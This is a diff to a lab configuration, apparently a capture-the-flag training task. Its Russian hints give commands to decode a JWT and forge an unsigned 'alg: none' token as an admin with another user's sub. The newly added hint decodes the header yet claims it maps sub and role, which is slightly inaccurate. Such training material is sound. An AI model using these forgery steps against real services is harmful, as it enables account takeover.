@@ -20,6 +20,7 @@ lab:
   files: [task.md, token.txt]
   check: 'grep -q ''nto{'' found.txt'
   hints:
+    - "Повторение (`web-recon-fuzzing`): `cut -d. -f1 token.txt | base64 -d` — разложи JWT и составь карту полей (alg/sub/role) перед подделкой."
     - 'Токен в `token.txt`. Посмотри payload: `cut -d. -f2 token.txt | base64 -d`.'
     - 'Сервер не проверяет подпись — примет `alg: none`. Собери новый заголовок: `echo -n ''{"alg":"none","typ":"JWT"}'' | base64 -w0`.'
     - 'Собери payload админа (чужой sub): `echo -n ''{"sub":"1","role":"admin"}'' | base64 -w0`.'
